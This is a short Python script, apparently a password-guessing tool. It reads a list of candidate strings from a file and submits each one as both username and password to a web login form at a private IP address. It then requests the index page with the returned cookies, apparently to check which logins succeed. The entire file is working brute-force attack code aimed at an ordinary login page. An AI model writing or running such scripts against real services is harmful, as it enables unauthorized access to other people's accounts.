import requests





savePath = '/home/h101/chinazz/126sum.out'  # 文件路径  这里用的
mFile = open(savePath,'r')   #用二进制写入 时会出现错误
#mFile.write(data)
#mFile.close()



login_url = "http://10.203.87.50/index.php/Public/checkLogin"


url2 = "http://10.203.87.50/index.php/Index"
#url3 = "http://10.203.87.50/index.php/Sidebar/showState"


sum = 0;
flag = False
for i in mFile:
    try:
        i = i.strip()
        print(i)
        logindata={
            "txtName":i,
            "txtPass":i,
            "txtCheck":"no",

        }


        r = requests.post(login_url,data=logindata)
        html = r.text
        print(r.text)

        r2 = requests.get(url2,cookies=r.cookies)
        #r3 = requests.get(url3, cookies=r.cookies)

        #print(r2.text)
    except:
        c = 1



mFile.close()
